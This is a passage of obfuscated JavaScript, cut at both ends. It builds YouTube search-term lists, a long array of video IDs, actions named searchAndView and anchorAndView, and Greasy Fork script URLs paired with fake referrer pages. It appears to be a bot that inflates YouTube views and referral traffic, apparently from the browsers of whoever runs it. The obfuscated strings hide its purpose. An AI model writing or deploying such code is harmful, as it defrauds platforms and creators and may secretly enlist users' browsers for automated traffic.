searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + U(0xf) + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith'][V(0x6, 'L[ug') + 'nd'](0x1 * 0x6c3 + 0x362 + -0xa1b)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x17 * -0x141 + 0x4c * -0x7c + 0x41b1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + U(0x16) + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1 * -0x1a1 + -0x1afe + 0x1ca2 * 0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    V(0x18, 'v#90') + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    V(0x5, 'cR[l') + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    U(0x2) + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    U(0x4) + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    U(0x14) + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    V(0xd, '6SNA') + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + U(0x7) + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + U(0xb)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + V(0x8, '6c]u') + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + U(0x15) + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + U(0x1) + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
